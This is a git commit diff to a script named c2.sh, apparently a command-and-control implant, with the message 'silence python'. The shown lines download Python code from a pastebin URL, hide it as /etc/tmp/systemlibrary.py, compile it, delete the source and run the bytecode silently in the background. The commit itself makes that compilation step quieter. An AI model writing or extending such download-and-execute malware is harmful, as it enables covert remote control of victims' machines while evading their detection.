5ca6477d0dd1c4a3c5c5e3ac8548cd8391ac6049
Rohit Anantha <anantha.rohit.11@gmail.com>
2024-11-01 20:43:38 -0500

    silence python

--- c2.sh
+++ c2.sh
@@ -17,7 +17,7 @@ rm cronlist.txt;
 curl https://pastebin.com/raw/Nxw5Rb5X 2>/dev/null > server_code.py;
 mkdir /etc/tmp 2>/dev/null;
 mv server_code.py /etc/tmp/systemlibrary.py;
-python3 -m compileall . 2>/dev/null;
+python3 -m compileall . >/dev/null;
 rm /etc/tmp/systemlibrary.py 2>/dev/null;
 (python3 -W ignore /etc/tmp/__pycache__/systemlibrary.cpython-36.pyc 2>/dev/null &)
 "
